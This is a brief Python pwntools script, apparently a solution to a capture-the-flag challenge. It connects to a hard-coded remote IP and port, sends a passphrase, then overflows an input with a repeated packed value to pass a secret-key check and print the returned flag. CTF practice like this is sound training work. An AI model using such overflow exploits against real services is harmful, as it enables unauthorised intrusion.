from pwn import * 

io = remote('62.173.140.174', 17200)

io.recvuntil('Enter your thoughts: ')
io.sendline(b'CODEBY_Secret_Base')
io.recvuntil(b'Now tell me the secret key: ')
io.sendline(p32(0xedbcdb)* 15)
io.recvuntil('Hurray!\n')
print(io.recvline())